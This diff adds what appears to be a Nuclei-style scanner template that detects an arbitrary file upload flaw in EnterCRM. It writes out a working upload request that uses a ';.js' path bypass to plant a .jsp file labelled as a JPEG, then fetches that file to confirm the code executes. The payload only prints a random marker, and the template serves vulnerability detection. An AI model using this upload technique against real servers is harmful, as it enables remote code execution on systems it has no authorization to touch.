@@ -1,0 +1,57 @@
+id: poc-zhe-da-en-te-crm-anyfile-upload
+info:
+  name: Zhejiang University EnterCRM Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload,crm,critical
+  description: |
+    This template checks for arbitrary file upload vulnerability in Zhejiang University EnterCRM all versions.
+
+variables:
+  t1: "{{rand_text_alphanumeric(8)}}"
+  t2: "{{md5(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/entsoft/CustomerAction.entphone;.js?method=loadFile"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundarye8FPHsIAq9JN8j2A"
+    body: |-
+      ------WebKitFormBoundarye8FPHsIAq9JN8j2A
+      Content-Disposition: form-data; name="file";filename="{{t1}}.jsp"
+      Content-Type: image/jpeg
+
+      <%out.print("{{t2}}");%>
+      ------WebKitFormBoundarye8FPHsIAq9JN8j2A--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "filepath"
+    extractors:
+      - type: regex
+        name: jsp
+        internal: true
+        regex:
+          - '\"filepath\":\"(?P<jsp>.*?)\"'
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/{{jsp}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
